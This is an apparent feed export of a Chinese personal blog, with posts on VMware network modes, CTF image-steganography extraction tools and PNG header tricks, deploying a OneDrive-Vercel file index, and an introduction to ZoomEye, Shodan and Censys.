<p>当我们安装VMware时，VMware会自动为3种网络连接模式各自创建1个虚拟机网络（如下图）：VMnet0(桥接模式)、VMnet8(NAT模式)、VMnet1(仅主机模式)。此外，我们也可以根据需要自行创建更多的虚拟网络。</p>
<p><img src="https://img.anineg.space/image-20221005153913571.png" alt="image-20221005153913571"></p>
<h1>桥接模式</h1>
<p>VMware桥接模式，也就是将虚拟机的虚拟网络适配器与主机的物理网络适配器进行交接，虚拟机中的虚拟网络适配器可通过主机中的物理网络适配器直接访问到外部网络。简而言之，这就好像在局域网中添加了一台新的、独立的计算机一样。因此，虚拟机也会占用局域网中的一个IP地址，并且可以和其他终端进行相互访问。</p>
<p>桥接模式网络连接支持有线和无线主机网络适配器。如果你想把虚拟机当做一台完全独立的计算机看待，并且允许它和其他终端一样的进行网络通信，那么桥接模式通常是虚拟机访问网络的最简单途径。</p>
<h2 id="示例">示例</h2>
<p><img src="https://img.anineg.space/image-20221005170013772.png" alt="image-20221005170013772"></p>
<h1>NAT模式</h1>
<p>NAT，是Network Address Translation的缩写，意即网络地址转换。NAT模式也是VMware创建虚拟机的默认网络连接模式。使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信。虚拟机向外部网络发送的请求数据"包裹"，都会交由NAT网络适配器加上"特殊标记"并以主机的名义转发出去，外部网络返回的响应数据"包裹"，也是先由主机接收，然后交由NAT网络适配器根据"特殊标记"进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。</p>
<p>此外，在一台主机上只允许有一个NAT模式的虚拟网络。因此，同一台主机上的多个采用NAT模式网络连接的虚拟机也是可以相互访问的。</p>
<h2 id="示例-v2">示例</h2>
<p><img src="https://img.anineg.space/image-20221005170142024.png" alt="image-20221005170142024"></p>
<h1>仅主机模式</h1>
<p>仅主机模式，是一种比NAT模式更加封闭的的网络连接模式，它将创建完全包含在主机中的专用网络。仅主机模式的虚拟网络适配器仅对主机可见，并在虚拟机和主机系统之间提供网络连接。相对于NAT模式而言，仅主机模式不具备NAT功能，因此在默认情况下，使用仅主机模式网络连接的虚拟机无法连接到Internet(在主机上安装合适的路由或代理软件，或者在Windows系统的主机上使用Internet连接共享功能，仍然可以让虚拟机连接到Internet或其他网络)。</p>
<p>在同一台主机上可以创建多个仅主机模式的虚拟网络，如果多个虚拟机处于同一个仅主机模式网络中，那么它们之间是可以相互通信的；如果它们处于不同的仅主机模式网络，则默认情况下无法进行相互通信(可通过在它们之间设置路由器来实现相互通信)。</p>
<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
              <div class="content">
              <div class="tag link"><a class="link-card" title="桥接模式、NAT模式和仅主机模式" href="https://blog.csdn.net/swadian2008/article/details/109518783"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">桥接模式、NAT模式和仅主机模式</p><p class="url">https://blog.csdn.net/swadian2008/article/details/109518783</p></div></a></div>
              </div>
            </details>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>《拒绝校园贷》——大学生心理微电影</title>
    <url>/2022/05/01/weidianying/</url>
    <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
</div>
<div align="center" class="aspect-ratio">
    <iframe src="https://player.bilibili.com/player.html?aid=853713641&amp;&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" high_quality="1" danmaku="1" allowfullscreen="true"> 
    </iframe>
</div>
]]></content>
      <categories>
        <category>视频</category>
      </categories>
      <tags>
        <tag>bilibili</tag>
      </tags>
  </entry>
  <entry>
    <title>《我不是药神》</title>
    <url>/2022/03/17/wobushiyaoshen/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="666d2179323feb5ec551598dfa620f9d33b63bb1b19f3500446823dea8a9a014"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-up">
      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，请输入密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>随手记</category>
      </categories>
  </entry>
  <entry>
    <title>CTF隐写术(图片隐写)</title>
    <url>/2022/06/25/yinxie1/</url>
    <content><![CDATA[<h2 id="附加式的图片隐写：">附加式的图片隐写：</h2>
<h3 id="字符串方式：">字符串方式：</h3>
<p>字符串附加在文件的后面是因为，如果图片附加在中间，可能破坏图片的信息；如果附加在图片的头部位置，又破坏了文件头。基于此点，也可以使用16进制编辑器找到这一串字符串。</p>
<div class="note success flat"><p>分离方法：</p>
</div>
<ul>
<li>strings分离：</li>
</ul>
<p><code>-a --all</code>：扫描整个文件而不是只扫描目标文件初始化和装载段</p>
<p><code>-f –print-file-name</code>：在显示字符串前先显示文件名</p>
<p><code>-t --radix={o,d,x} </code>：输出字符的位置，基于八进制，十进制或者十六进制</p>
<p><code>-e --encoding={s,S,b,l,B,L} </code>：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit</p>
<p>分离命令：（cmd）</p>
<p><code>strings xxx.jpg</code></p>
<p><img src="https://img.anineg.space/clip_image002.jpg" alt="img"></p>
<p>使用WinHex查看图片源码或查看图片属性。</p>
<p><img src="https://img.anineg.space/clip_image001.png" alt="img"></p>
<p><img src="https://img.anineg.space/24287763980e488e50bc02d0c124f50.jpg" alt="24287763980e488e50bc02d0c124f50"></p>
<h3 id="图种方式：">图种方式：</h3>
<h4 id="图片后缀："><strong>图片后缀：</strong></h4>
<p>将图片后缀名改为<code>.zip\rar\7z</code>等压缩格式后打开。</p>
<h4 id="图片拼接："><strong>图片拼接：</strong></h4>
<p>以cmd命令行<code>copy /b 1.jpg+2.jpg 3.jgp</code> 以二进制方式连接两个图片。</p>
<p><img src="https://img.anineg.space/df4032ac69627c834b2d9787cbda5ab.jpg" alt="df4032ac69627c834b2d9787cbda5ab"></p>
<div class="note default flat"><p>分析方法：</p>
</div>
<p>使用binwalk工具分析图片，可以发现从35786块偏移开始有另一张jpg图片。（win下安装binwalk：<code>python setup.py install</code>）：</p>
<p><code>C:\Python27\Scripts&gt;python binwalk 3.jpg</code></p>
<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20220725084840.png" alt="QQ截图20220725084840"></p>
<div class="note success flat"><p>分离方法：</p>
</div>
<ul>
<li>一是使用WinHex分离：</li>
</ul>
<p>jpg格式文件开始的2字节是FF D8，之后2个字节是FF E0 ，最后2个字节是图像文件结束标记为FF D9 。我们打开3.jpg，<kbd>Alt</kbd>+<kbd>A</kbd>全选图片16进制数值，菜单—搜索—十六进制数值—填入FFD8—取消统计次数—勾选列出搜索结果，定位到第二个FFD8处（或使用Alt+G快捷键定位到35786处），使用<kbd>Alt</kbd>+<kbd>1</kbd>快捷键选取FF为开始块，<kbd>Alt</kbd>+<kbd>2</kbd>选取D9为结束块，然后右键—Edit—Copy Block—Into New File保存.jpg后缀的文件。得到隐藏图片：</p>
<p><img src="https://img.anineg.space/34921ef294be4074adb6d8f139f2450.jpg" alt="34921ef294be4074adb6d8f139f2450"></p>
<ul>
<li>二是使用foremost分离:</li>
</ul>
<p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具。</p>
<p>分离命令：</p>
<p><code>foremost xxx.jpg</code></p>
<p>会自动生成output目录存放分离出文件。</p>
<h4 id="文件拼接："><strong>文件拼接：</strong></h4>
<p>使用命令 <code>copy /b 1.jpg + 1.zip 2.jpg</code>，利用copy命令将两个文件以二进制方式连接起来。在jpg中结束符是FF D9，图片查看器会忽视jpg结束符之后的内容，所以附加的zip不会影响到图像的正常显示。</p>
<div class="note success flat"><p>分离方法：</p>
</div>
<ul>
<li>一是使用WinHex分离：</li>
</ul>
<p>50 4B 03 04就是ZIP文件的文件头，一般以PK表示。</p>
<p><img src="https://img.anineg.space/d7ccba40dff1ba6fe347504f70188d0.jpg" alt="d7ccba40dff1ba6fe347504f70188d0"></p>
<p>选取以50开头以及到末尾的的数据，右键单击，选择编辑，复制选块到新文件，保存新文件为zip格式命名规则即可。</p>
<p><img src="https://img.anineg.space/21482f0d7a82c9f1b67906676e4c20c.jpg" alt="21482f0d7a82c9f1b67906676e4c20c"></p>
<ul>
<li>二是使用foremost分离:</li>
</ul>
<p>具体操作同上。</p>
<p><img src="https://img.anineg.space/f91fe3f0dde2371b77916171ce9cd04.jpg" alt="f91fe3f0dde2371b77916171ce9cd04"></p>
<h2 id="基于文件结构的图片隐写："><strong>基于文件结构的图片隐写：</strong></h2>
<h3 id="PNG图片结构：">PNG图片结构：</h3>
<p>标准的PNG文件结构包括：PNG文件标识和PNG数据块。<br>
PNG图片文件结构：</p>
<ul>
<li>
<p>（固定）8字节89 50 4E 47 0D 0A 1A 0A为png文件头；</p>
</li>
<li>
<p>（固定）4字节00 00 00 0D（即十进制的13）代表数据块的长度为13；</p>
</li>
<li>
<p>（固定）4字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标识（IDCH）；</p>
</li>
<li>
<p>（可变）13位数据块（IHDR)</p>
<ul>
<li>
<p>前四个字节代表该图片的宽</p>
</li>
<li>
<p>后四个字节代表该图片的高</p>
</li>
<li>
<p>后五个字节依次为：</p>
<p>Bit depth、ColorType、Compression method、Filter method、Interlace method</p>
</li>
</ul>
</li>
<li>
<p>（可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到。</p>
</li>
</ul>
<p>PNG图片文件头数据块（IHDR）包括：宽、高、图像深度、颜色类型、压缩方法等（图中蓝色的部分即IHDR数据块）。</p>
<p><img src="https://img.anineg.space/89072cd3f4721309420f26c5c7533bd.jpg" alt="89072cd3f4721309420f26c5c7533bd"></p>
<h3 id="修改高度隐写：">修改高度隐写：</h3>
<p>先用TweakPNG打开图片，一般修改过长宽的图片都会报错。</p>
<p><img src="https://img.anineg.space/949de65f4ff87fbd366de838431daf7.jpg" alt="949de65f4ff87fbd366de838431daf7"></p>
<p>找到PNG图片高度值所对应的位置，并修改为一个较大的值，尝试打开。</p>
<p><img src="https://img.anineg.space/9f890ebd638fd22da6d2b7be6882317.jpg" alt="9f890ebd638fd22da6d2b7be6882317"></p>
<p><img src="https://img.anineg.space/bb43ce097549bc9b01e09186dff2251.jpg" alt="bb43ce097549bc9b01e09186dff2251"></p>
<p>修改01 00为02 00，并保存后打开。</p>
<p><img src="https://img.anineg.space/2288734b6f6c69f29825cbb15cf37f9.jpg" alt="2288734b6f6c69f29825cbb15cf37f9"></p>
<p>修改宽高之后的PNG图片可能打不开，需要修复PNG图片的CRC校验值。</p>
<p>方法：</p>
<p>选中PNG的struct IHDR Ihdr部分(图中蓝色部分)，使用CRC Calculator重新计算CRC校验值。</p>
<p><img src="https://img.anineg.space/1e285f2630640e2b39434b522daff1a.jpg" alt="1e285f2630640e2b39434b522daff1a"></p>
<p><img src="https://img.anineg.space/19bb5406ba211bb5aa4d62695ddeebf.jpg" alt="19bb5406ba211bb5aa4d62695ddeebf"></p>
<p>将struct IHDR Ihdr的CRC（图中蓝色部分）修改为重新计算过的CRC。</p>
<p><img src="https://img.anineg.space/cf44a728561676addc2df8254671312.jpg" alt="cf44a728561676addc2df8254671312"></p>
<p>再用TweakPNG打开图片不报错，修复成功。</p>
<h3 id="IDAT块的隐写：">IDAT块的隐写：</h3>
<p>PNGCheck可以验证PNG图片的完整性（通过检查内部CRC-32校验和&amp;bra;比特&amp;ket;)和解压缩图像数据，它能够转储几乎所有任选的块级别信息在该图像中的可读数据。</p>
<p>查询命令：</p>
<p><code>pngcheck -v xxx.png</code></p>
<p><img src="https://img.anineg.space/88317a599a93fe7609d1067d860301f.jpg" alt="88317a599a93fe7609d1067d860301f"></p>
<h2 id="基于LSB原理的图片隐写："><strong>基于LSB原理的图片隐写：</strong></h2>
<h3 id="简单的LSB隐写："><strong>简单的LSB隐写：</strong></h3>
<p>利用LSB（最低有效位 (Least Significant Bit)来进行隐写。例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像数中的最低的1bit，人眼无法区别。例如我们想把A隐藏进来的话，可以把A转成16进制的0x61再转成二进制的01100001，再修改为红色通道的最低位为这些二进制串。</p>
<div class="note success flat"><p>分离方法：</p>
</div>
<ul>
<li>Stegsolve分离：</li>
</ul>
<p>使用Stegsolve—Analyse—Frame Browser，可以浏览三个颜色通道中的每一位。</p>
<p><img src="https://img.anineg.space/beb6ede00c628a88f332085e2c88a53.jpg" alt="beb6ede00c628a88f332085e2c88a53"></p>
<div class="note info flat"><p>此种隐写的载体一般为png或bmp格式，jpg的有损压缩方式会破坏隐写的内容。</p>
</div>
<h2 id="基于DCT域的JPG图片隐写："><strong>基于DCT域的JPG图片隐写：</strong></h2>
<h3 id="背景知识：">背景知识：</h3>
<p>JPEG图像格式使用离散余弦变换（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。</p>
<p>因为丢失了部分数据，所以DCT是一种有损压缩（Loss Compression）技术，但一般不会影响图像的视觉效果。</p>
<p>在这个隐写家族中，常见的隐写方法有JSteg、JPHide、Outguess、F5等等，分离方法为Stegdetect。</p>
<h3 id="Stegdetect简介：">Stegdetect简介：</h3>
<p>Stegdetect可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息，并且还具有基于字典暴力破解密码方法提取通过Jphide、outguess和jsteg-shell方式嵌入的隐藏信息。</p>
<p>Stegdetect参数：</p>
<ul>
<li>-q 仅显示可能包含隐藏内容的图像。</li>
<li>-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</li>
<li>-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</li>
<li>-d 打印带行号的调试信息。</li>
<li>-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：
<ul>
<li>j 检测图像中的信息是否是用jsteg嵌入的。</li>
<li>o 检测图像中的信息是否是用outguess嵌入的。</li>
<li>p 检测图像中的信息是否是用jphide嵌入的。</li>
<li>i 检测图像中的信息是否是用invisible secrets嵌入的。</li>
</ul>
</li>
<li>-V 显示软件版本号。</li>
</ul>
<p>Stegdetect会在检测结果后面使用1～3颗星来标识隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能性最大。</p>
<p>Stegdetect命令（cmd）：</p>
<p><code>stegdetect.exe -tjopi -s 100.0 xxx.jpg</code></p>
<h3 id="JPHS提取：">JPHS提取：</h3>
<p>使用Stegdetect探测jpg隐藏种类。</p>
<p><img src="https://img.anineg.space/797a9f47e0df8be20bc3afbbaa2af9c.jpg" alt="797a9f47e0df8be20bc3afbbaa2af9c"></p>
<p>使用JPHS打开图片，点击Seek功能，会弹出一个密码的输入框，这里默认为空口令，点击OK，将提取出来的信息保存为flag.txt。</p>
<p><img src="https://img.anineg.space/24de8d824f7babbfbe3af26f1480d30.jpg" alt="24de8d824f7babbfbe3af26f1480d30"></p>
<h3 id="Outguess提取：">Outguess提取：</h3>
<p>使用Stegdetect探测jpg隐藏种类。</p>
<p><img src="https://img.anineg.space/8e07335b18d8141a78d98a3daf658f3.jpg" alt="8e07335b18d8141a78d98a3daf658f3"></p>
<p>点击Enter key功能，输入密码，这里我隐写的时候，使用的密码是123456</p>
<p>点击Load image 加载目标图片</p>
<p>点击Extract file功能，将提取出来的信息保存成flag.txt文件。</p>
<p><img src="https://img.anineg.space/3c22b301752d18da5b49d16e6c7e3b3.jpg" alt="3c22b301752d18da5b49d16e6c7e3b3"></p>
<h2 id="数字水印的隐写："><strong>数字水印的隐写：</strong></h2>
<h3 id="背景知识：-v2">背景知识：</h3>
<h4 id="数字水印：">数字水印：</h4>
<p>数字水印（digital watermark）技术，是指在数字化的数据内容中嵌入不明显的记号。</p>
<p>特征是，被嵌入的记号通常是不可见或不可察的，但是可以通过计算操作检测或者提取。</p>
<h4 id="盲水印与傅里叶变换：">盲水印与傅里叶变换：</h4>
<p>盲水印，是指人感知不到的水印，包括看不到或听不见（没错，数字盲水印也能够用于音频）。其主要应用于音像作品、数字图书等，目的是，在不破坏原始作品的情况下，实现版权的防护与追踪。</p>
<p>对图像进行傅里叶变换，起始是一个二维离散傅里叶变换，图像的频率是指图像灰度变换的强烈程度，将二维图像由空间域变为频域后，图像上的每个点的值都变成了复数，也就是所谓的复频域，通过复数的实部和虚部，可以计算出幅值和相位，计算幅值即对复数取模值，将取模值后的矩阵显示出来，即为其频谱图。但是问题来了，复数取模后，数字有可能变的很大，远大于255，如果数据超过255，则在显示图像的时候会都当做255来处理，图像就成了全白色。因此，一般会对模值再取对数，在在0~255的范围内进行归一化，这样才能够准确的反映到图像上，发现数据之间的差别，区分高频和低频分量，这也是进行傅里叶变换的意义。</p>
<h3 id="2-频域盲水印隐写："><strong>2.</strong> <strong>频域盲水印隐写：</strong></h3>
<div class="note success flat"><p>分离方法：</p>
</div>
<ul>
<li>Blind-watermark（python 2.7）：</li>
</ul>
<p>分离水印命令：</p>
<p><code>python decode.py --original &lt;original image file&gt; --image &lt;image file&gt; --result &lt;result file&gt;</code></p>
<p>添加水印命令：</p>
<p><code>python encode.py --image &lt;image file&gt; --watermark &lt;watermark file&gt; --result &lt;result file&gt;</code></p>
<p><img src="https://img.anineg.space/4a35bce354a1b54e2def8672c497efc.jpg" alt="4a35bce354a1b54e2def8672c497efc"></p>
<h2 id="图片容差隐写："><strong>图片容差隐写：</strong></h2>
<h3 id="背景知识：-v3">背景知识：</h3>
<p>容差，在选取颜色时所设置的选取范围，容差越大，选取的范围也越大，其数值是在0-255之间。</p>
<h3 id="容差比较的隐写：">容差比较的隐写：</h3>
<div class="note success flat"><p>分离方法：</p>
</div>beyond compare分离：
<p>操作步骤：</p>
<p>打开工具，选择图片比较，导入example_1.jpg和example_2.jpg。</p>
<p><img src="https://img.anineg.space/15cdf2bf138ae65a0416733d2bc2ed1.jpg" alt="15cdf2bf138ae65a0416733d2bc2ed1"></p>
<p>选择容差模式，并调整容差大小</p>
<p><img src="https://img.anineg.space/a48145f9f1a24a8ddf98c92c2082b59.jpg" alt="a48145f9f1a24a8ddf98c92c2082b59"></p>
<h2 id="二维码隐写：">二维码隐写：</h2>
<h3 id="QR-Research解码：">QR Research解码：</h3>
<p>使用QR Research读取二维码中的信息。</p>
<p><img src="https://img.anineg.space/e10d4e28da69762f1350da850be6e46.jpg" alt="e10d4e28da69762f1350da850be6e46"></p>
<h3 id="python脚本生成二维码："><strong>python脚本生成二维码：</strong></h3>
<p>使用python脚本，10组合的将字符串解码成flag.png。</p>
<p><img src="https://img.anineg.space/268f9fbc4e20e973c0c2e594c4d04a5.jpg" alt="268f9fbc4e20e973c0c2e594c4d04a5"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建几乎0成本的个人网盘</title>
    <url>/2022/11/20/yunpan/</url>
    <content><![CDATA[<h1>Onedrive-Vercel-Index</h1>
<p>最近在网上发现了一个挺有意思的项目<a href="https://github.com/spencerwooo/onedrive-vercel-index/">onedrive-vercel-index</a>，它可以在Vercel上部署一个属于你自己的网盘。那么相比于百度网盘，你对他有着很高的控制权，<s>并不需要担心你的资源会被河蟹</s>。那么至于网速，Onedrive给的带宽不太稳定，有时可以跑到满速，有时只有3MB/s，但怎么说也比某度网盘良心多了。</p>
<p>但这个网盘最大的缺点就在于空间上。现在注册Onedrive默认是5GB的空间，这显然不够用。但是也并非没有办法，我们在某宝上花个大概三块钱就可以把一个账号的空间永久提升至15GB。当然，如果你是购买了office365的话，那你就可以拿到1T的容量，就不需要担心什么容量的问题。网上还有一种教育版的，容量为1-5T，但是我不建议大家使用，因为这个账号的管理员可以看到你的文件，大家应该都知道数据的重要性，所以不要贪便宜使用这种。</p>
<p>最后一个问题，Vercel给你提供默认的域名大概率由于某些原因无法访问，所以你还需要拥有一个自己的域名，并把它解析到Vercel上。购买一个域名其实并不贵，如果是新用户就会更便宜了。例如<code>.space</code> <code>.top</code> <code>.asia</code>这类，新用户只需要个位数就能拿下一年，甚至在搞活动的时候一块钱就能拿下一个<code>.cn</code>域名。一个域名可以解析到很多服务器，对于已经有域名的同学来说，这个成本直接忽略不计。</p>
<p>因此，与我个人而言，搭建这个基本上是不需要成本的，只是需要花费那么一丢丢的时间。但是对于刚上手的同学们来说，需要那么一点点的开销，但<s>相对于某度会员或者是他们卖的那种“24小时高速下载券”来说</s>并不多。</p>
<h1>搭建网盘</h1>
<h2 id="准备工作">准备工作</h2>
<ul>
<li>一台能上网的电脑</li>
<li>一个GitHub账号</li>
<li>一个Vercel账号</li>
<li>一个Onedrive账号</li>
</ul>
<p>打开 onedrive-vercel-index 的<a href="https://github.com/spencerwooo/onedrive-vercel-index/">项目地址</a>并 <a href="https://github.com/spencerwooo/onedrive-vercel-index/fork">Fork</a> 到自己的账号中。</p>
<p>打开项目中的/config/site.config.js，这个就是你的网盘的配置文件了，按照提示进行修改。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * This file contains the configuration used for customising the website, such as the folder to share,</span><br><span class="line"> * the title, used Google fonts, site icons, contact info, etc.</span><br><span class="line"> */</span><br><span class="line">module.exports = {</span><br><span class="line">  // This is what we use to identify who you are when you are initialising the website for the first time.</span><br><span class="line">  // Make sure this is exactly the same as the email address you use to sign into your Microsoft account.</span><br><span class="line">  // You can also put this in your Vercel's environment variable 'NEXT_PUBLIC_USER_PRINCIPLE_NAME' if you worry about</span><br><span class="line">  // your email being exposed in public.</span><br><span class="line">  userPrincipalName: process.env.NEXT_PUBLIC_USER_PRINCIPLE_NAME || '此处填写你的Onedrive账号',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is the website icon to the left of the title inside the navigation bar. It should be placed under the</span><br><span class="line">  // /public directory of your GitHub project (not your OneDrive folder!), and referenced here by its relative path to /public.</span><br><span class="line">  icon: '/icons/aninegtubiao.png(你的网站图标路径)',</span><br><span class="line"></span><br><span class="line">  // Prefix for KV Storage</span><br><span class="line">  kvPrefix: process.env.KV_PREFIX || '',</span><br><span class="line"></span><br><span class="line">  // The name of your website. Present alongside your icon.</span><br><span class="line">  title: "此处填写你的网站名字",</span><br><span class="line"></span><br><span class="line">  // The folder that you are to share publicly with onedrive-vercel-index. Use '/' if you want to share your root folder.</span><br><span class="line">  baseDirectory: '/Public(你要在网页上展示的文件夹)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This represents the maximum number of items that one directory lists, pagination supported.</span><br><span class="line">  // Do note that this is limited up to 200 items by the upstream OneDrive API.</span><br><span class="line">  maxItems: 100,</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] We use Google Fonts natively for font customisations.</span><br><span class="line">  // You can check and generate the required links and names at https://fonts.google.com.</span><br><span class="line">  // googleFontSans - the sans serif font used in onedrive-vercel-index.</span><br><span class="line">  googleFontSans: 'Inter',</span><br><span class="line">  // googleFontMono - the monospace font used in onedrive-vercel-index.</span><br><span class="line">  googleFontMono: 'Fira Mono',</span><br><span class="line">  // googleFontLinks -  an array of links for referencing the google font assets.</span><br><span class="line">  googleFontLinks: ['https://fonts.googleapis.com/css2?family=Fira+Mono&amp;family=Inter:wght@400;500;700&amp;display=swap'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] The footer component of your website. You can write HTML here, but you need to escape double</span><br><span class="line">  // quotes - changing " to \". You can write anything here, and if you like badges, generate some with https://shields.io</span><br><span class="line">  footer:</span><br><span class="line">    'Copyright © 2022 &lt;a href="https://anineg.space/" target="_blank"&gt;ANINEG&lt;/a&gt;  &amp;nbsp&amp;nbsp|&amp;nbsp&amp;nbsp  网盘资源仅供学习交流，严禁用于商业用途，请于24小时内删除(这里是页脚的内容)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is where you specify the folders that are password protected. It is an array of paths pointing to all</span><br><span class="line">  // the directories in which you have .password set. Check the documentation for details.</span><br><span class="line">  protectedRoutes: ['/个人', '/(这里几个地方填你要加密的文件夹的路径，将密码存成.password文件放在文件夹下)'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] Use "" here if you want to remove this email address from the nav bar.</span><br><span class="line">  email: 'mailto:email@anineg.space(别人联系你的邮箱地址，不要删掉就行)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is an array of names and links for setting your social information and links.</span><br><span class="line">  // In the latest update, all brand icons inside font awesome is supported and the icon to render is based on the name</span><br><span class="line">  // you provide. See the documentation for details.</span><br><span class="line">  links: [</span><br><span class="line">    {</span><br><span class="line">      name: '主页',</span><br><span class="line">      link: 'https://anineg.space/',</span><br><span class="line">    },</span><br><span class="line">  ],//这里填导航栏上你想要显示的链接</span><br><span class="line"></span><br><span class="line">  // This is a day.js-style datetime format string to format datetimes in the app. Ref to</span><br><span class="line">  // https://day.js.org/docs/en/display/format for detailed specification. The default value is ISO 8601 full datetime</span><br><span class="line">  // without timezone and replacing T with space.</span><br><span class="line">  datetimeFormat: 'YYYY-MM-DD HH:mm:ss',</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>然后打开 <a href="https://vercel.com/">Vercel 官网</a>注册登录，然后点 <code>New Project</code>，然后 Import 你刚刚 Fork 的仓库。然后点击 Deploy，仓库就会自动开始部署，一两分钟以后就好了。接下来，打开 Marketplace 中的 <a href="https://vercel.com/integrations/upstash">Upstash</a>，点击 <code>Add Integration</code>，然后选中你的账户，再选中你部署的仓库。如果这时出现了一些选项，最好都填上勾上。等待 Upstash 创建 Redis 数据库。完成创建后，在项目的 <code>Deployments</code> 中将项目 <code>Redeploy</code>。重新部署完成后，在<code>Settings</code>-<code>Domains</code>中填写你的域名并将其解析至Vercel后，即可访问部署好的网站。</p>
<p>打开网站，根据网站的引导进行操作即可。到这里，你就拥有了一个自己的网盘了！</p>
<p>当然，拿它来当图床，我想也是很不错的。</p>
<h1>ANINEGの网盘</h1>
<p>最后，放上我的网盘来给大家参考一下：</p>
<p><img src="https://img.anineg.space/image-20221120120327292.png" alt="image-20221120120327292"></p>
<p>网盘链接：</p>
<div class="tag link"><a class="link-card" title="ANINEGの网盘" href="https://pan.anineg.space/zh-CN/"><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">ANINEGの网盘</p><p class="url">https://pan.anineg.space/zh-CN/</p></div></a></div>
]]></content>
      <categories>
        <category>随手记</category>
      </categories>
      <tags>
        <tag>Vercel</tag>
        <tag>网盘</tag>
      </tags>
  </entry>
  <entry>
    <title>ZoomEye-网络空间搜索引擎</title>
    <url>/2022/10/09/zoomeye/</url>
    <content><![CDATA[<p class="p center logo large">ZoomEye (钟馗之眼)</p>
<p class="p center small">一个针对网络空间的搜索引擎</p>
<p><img src="https://img.anineg.space/zoomeye2.png" alt=""></p>
<h1>ZoomEye</h1>
<p>得益于科技的高速发展，现在接入互联网的设备五花八门。除了PC和服务器，还有路由器、物联网家电、平板电脑、手机等，甚至还有监控探头、工业控制中的SCADA系统等比较敏感的设备。这些设备被视作节点，共同组成了我们所处的的<strong>网络空间（Cyberspace）</strong>。</p>
<p><a href="https://www.zoomeye.org/">ZoomEye(“钟馗之眼”)网络空间搜索引擎</a>正是一个检索网络空间节点的搜索引擎。通过后端的分布式爬虫引擎（无论谁家的搜索引擎都是这样）对全球节点的分析，对每个节点的所拥有的特征进行判别，从而获得设备类型、固件版本、分布地点、开放端口服务等信息。</p>
<div class="tag link"><a class="link-card" title="ZoomEye 是什么？怎么用？" href="https://zhuanlan.zhihu.com/p/19710755"><div class="left"><img src="https://img.anineg.space/zhihulogo.png"></div><div class="right"><p class="text">ZoomEye 是什么？怎么用？</p><p class="url">https://zhuanlan.zhihu.com/p/19710755</p></div></a></div>
<h1>其他网络空间搜索引擎</h1>
<p>目前国内外的网络空间搜索引擎有 shodan、zoomeye、cnesys、fofa</p>
<h2 id="Shodan">Shodan</h2>
<p><a href="https://www.shodan.io/">Shodan</a>是目前最为知名的黑客搜索引擎，它是由计算机程序员约翰·马瑟利（John Matherly）于 2009 年推出的，他在 2003 年就提出了搜索与 Internet 链接的设备的想法。发展至今已经变成搜索资源最全，搜索性能最强，TOP1 级别的网络资产搜索引擎。</p>
<p><img src="https://img.anineg.space/image-20221010164225527.png" alt="image-20221010164225527"></p>
<h2 id="Censys">Censys</h2>
<p><a href="https://search.censys.io/">Censys</a> 是由密歇根大学的计算机科学家创立，帮助信息安全从业人员发现、监控和分析从互联网访问的设备的平台，Censys 能够扫描整个互联网，每天扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
